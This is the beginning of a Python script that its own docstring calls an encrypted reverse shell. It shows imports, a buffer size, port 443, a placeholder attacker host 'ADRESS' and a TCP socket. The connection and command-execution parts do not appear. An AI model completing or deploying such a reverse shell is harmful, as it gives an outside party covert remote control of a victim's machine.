import socket 
import subprocess
import threading
import argparse

""" An Encrypted Reverse_Shell written in Python """

MAX_BUFF = 4096
DEFAULT_PORT = 443
HOST = "ADRESS"


sock_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
